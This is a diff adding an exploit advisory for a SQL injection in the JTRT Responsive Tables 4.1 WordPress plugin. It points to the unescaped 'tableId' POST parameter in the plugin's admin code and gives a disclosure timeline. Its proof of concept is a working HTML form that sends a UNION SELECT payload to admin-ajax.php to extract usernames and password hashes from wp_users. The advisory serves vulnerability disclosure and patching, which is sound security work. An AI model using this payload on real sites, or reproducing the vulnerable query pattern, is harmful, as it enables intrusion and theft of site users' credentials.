@@ -1,0 +1,44 @@
+# Exploit Title:  JTRT Responsive Tables 4.1 – WordPress Plugin – Sql Injection
+# Exploit Author: Lenon Leite
+# Vendor Homepage: https://wordpress.org/plugins/jtrt-responsive-tables/
+ 
+# Software Link: https://wordpress.org/plugins/jtrt-responsive-tables/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version: 4.1
+# Tested on: Ubuntu 16.04
+
+Description:
+
+    Type user acces: single user.
+
+$_POST[‘tableId’] is not escaped.
+
+http://lenonleite.com.br/en/blog/2017/09/11/jtrt-responsive-tables-wordpress-plugin-sql-injection/
+File / Code:
+
+Path: /wp-content/plugins/jtrt-responsive-tables/admin/class-jtrt-responsive-tables-admin.php
+
+Line :  183
+
+$getTableId = $_POST['tableId'];
+...
+
+$retrieve_data = $wpdb->get_results( "SELECT * FROM $jtrt_tables_name WHERE jttable_IDD = " . $getTableId );
+
+
+Proof of Concept:
+
+1 – Log in with single user.
+
+2 – Using form, sqli by post:
+
+<form method="post" action="http://target.dev/wp-admin/admin-ajax.php?action=get_old_table">
+   <input type="text" name="tableId" value="1 UNION SELECT 1,2,CONCAT(user_login,char(58),user_pass),4,5 FROM wp_users WHERE ID=1">
+   <input type="submit" name="">
+</form>
+
+    08/09/2017 – Discovered
+    11/09/2017 – Vendor finded
+    03/11/2017 – Publish
